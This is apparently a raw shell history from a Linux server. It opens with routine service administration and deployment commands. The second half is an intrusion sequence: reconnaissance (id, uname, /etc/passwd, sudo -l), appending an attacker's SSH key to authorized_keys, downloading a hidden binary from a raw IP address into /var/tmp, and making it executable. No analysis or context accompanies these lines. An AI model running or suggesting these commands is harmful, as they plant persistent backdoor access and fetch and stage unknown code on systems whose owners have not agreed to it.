sudo systemctl restart app
ls
make deploy
cd app
tail -f /var/log/app/app.log
git pull
systemctl status app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVpgUJZouYRZ6XZRQ6l365kWG6XmUuA1+DZSpQ/DRRw root@vps' >> ~/.ssh/authorized_keys
wget -q http://45.83.61.243/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
